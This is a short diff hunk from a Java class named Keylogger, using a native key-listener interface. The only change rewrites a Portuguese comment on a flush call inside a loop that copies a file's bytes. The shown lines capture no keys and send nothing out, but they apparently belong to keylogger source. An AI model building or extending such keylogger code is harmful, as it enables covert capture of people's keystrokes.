@@ -70,7 +70,7 @@ public class Keylogger implements NativeKeyListener {
              
              while((bytes=lendo_arquivo.read(dividindo_arquivo)) != -1) {
                  escreve_bytes.write(dividindo_arquivo, 0, bytes); //acessa a matriz com os bytes escritos do arquivo, posição da matriz do buffer que vai ser iniciada e lida, posição do números de bytes a serem lidos e escritos. Começando da posição 0, ou seja, o primeiro byte a ser acessado.
-                 escreve_bytes.flush(); //limpa resquício de memória.
+                 escreve_bytes.flush(); //força a escrita no arquivo.
              }
              lendo_arquivo.close(); //fecha leitor dos bytes do arquivo.
              
